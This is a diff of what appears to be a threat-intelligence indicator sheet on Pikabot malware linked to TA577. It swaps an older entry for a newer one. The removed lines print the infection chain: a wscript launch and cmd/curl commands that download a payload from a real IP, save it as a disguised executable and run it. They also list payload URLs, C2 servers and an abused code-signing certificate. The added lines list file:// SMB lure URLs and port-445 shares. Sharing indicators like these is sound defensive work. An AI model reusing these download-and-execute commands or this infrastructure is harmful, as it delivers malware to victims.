@@ -1,84 +1,67 @@
-22.02.2024 | Pikabot | TA577 | 1.8.32-beta
+27.02.2024 | Pikabot | TA577 |
 
 *************************************************
 
-.zip 4c29552b5fcd20e5ed8ec72dd345f2ea573e65412b65c99d897761d97c35ebfd
-.exe 89dc50024836f9ad406504a3b7445d284e97ec5dafdd8f2741f496cac84ccda9
+.zip 485515a2931e7357b00bbf196827a4f979da7740f7e3a25bd666c709cd4b256b
 
 *************************************************
 
-Code Signing Certificate
-Organisation:	A.P.Hernandez Consulting s.r.o.
-Issuer:	SSL.com EV Code Signing Intermediate CA RSA R3
-Algorithm:	sha256WithRSAEncryption
-Valid from:	2024-01-25T16:51:40Z
-Valid to:	2025-01-24T16:51:40Z
-Serial number:	 2941d5f8758501f9dbc4ba158058c3b5
-Thumbprint Algorithm:	SHA256
-Thumbprint:	 a982917ba6de9588f0f7ed554223d292524e832c1621acae9ad11c0573df54a5
+SMB Leakage
 
 *************************************************
 
-url > zip > smb > .exe
+zip > html > SMB
 
-wscript.exe C:\Users\Admin\AppData\Local\Temp\RATIONEVC.js
 
-cmd.exe /c mkdir  C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh & curl http://103.124.105.147/KNaDVX/0.3733734479965182.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-curl  http://103.124.105.147/KNaDVX/0.3733734479965182.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-cmd.exe /c mkdir  C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh & curl 0.4603378569149517.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-curl  0.4603378569149517.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-cmd.exe /c mkdir  C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh & curl 0.4168150928589275.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-curl 0.4168150928589275.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-cmd.exe /c mkdir  C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh & curl 0.7876609490027446.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-curl 0.7876609490027446.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-cmd.exe /c mkdir  C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh & curl 0.2609532278070895.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-curl  0.2609532278070895.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-cmd.exe /c mkdir  C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh & curl 0.8415582198813714.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-curl  0.8415582198813714.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-cmd.exe /c timeout 11 & C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
-
-timeout  11 
-
-*************************************************
-
-.dll distro
-
-http://103.124.105.140/guJ/0.9215685860313316.dat
-http://103.124.105.147/KNaDVX/0.3733734479965182.dat
 
 *************************************************
 
 c2's
 
-https://141.95.106.106:2967
-https://198.44.187.12:2224
-https://104.129.55.106:13783
-https://154.12.233.66:2224
-https://104.129.55.105:2223
-https://37.60.242.85:9785
-https://23.226.138.161:5242
-https://145.239.135.24:5243
-https://86.38.225.105:13721
-https://85.239.243.155:5000
-https://89.117.23.186:5632
-https://23.226.138.143:2083
-https://103.82.243.5:13785
-https://89.117.23.185:2221
-https://86.38.225.106:2221
-https://57.128.165.176:13721
-https://178.18.246.136:2078
-https://154.12.248.41:5000
+SMB Dummy Payload
+
+file://103.124.104.22/zjxb/bO.txt
+file://103.124.104.76/wsr6oh/Y.txt
+file://104.129.20.167/xhsmd/bOWEU.txt
+file://146.19.213.36/dbna/H.txt
+file://146.19.213.36/vei/yEZZ.txt
+file://176.123.2.146/5aohv/9mn.txt
+file://176.123.2.146/vbcsn/UOx.txt
+file://204.44.125.68/mcqef/yPXpC.txt
+file://66.63.188.19/bmkmsw/2.txt
+file://89.117.1.160/4bvt1yw/iC.txt
+file://89.117.1.160/zkf2r4j/VmD.txt
+file://89.117.1.161/epxq/A.txt
+file://89.117.1.161/epxq/Q.txt
+file://89.117.1.161/mtdi/ZQCw.txt
+file://89.117.2.33/7ipw/7ohq.txt
+file://89.117.2.33/hvwsuw/udrh.txt
+file://89.117.2.34/3m3sxh6/IuM.txt
+file://89.117.2.34/4qp/8Y.txt
+file://85.239.33.149/naams/p3aV.txt
+file://155.94.208.137/tgnd/zH9.txt
+
+SMB Share
+
+103.124.104.22:445
+103.124.104.76:445
+104.129.20.167:445
+146.19.213.36:445
+146.19.213.36:445
+176.123.2.146:445
+176.123.2.146:445
+204.44.125.68:445
+66.63.188.19:445
+89.117.1.160:445
+89.117.1.160:445
+89.117.1.161:445
+89.117.1.161:445
+89.117.1.161:445
+89.117.2.33:445
+89.117.2.33:445
+89.117.2.34:445
+89.117.2.34:445
+85.239.33.149:445
+155.94.208.137:445
 
 *************************************************
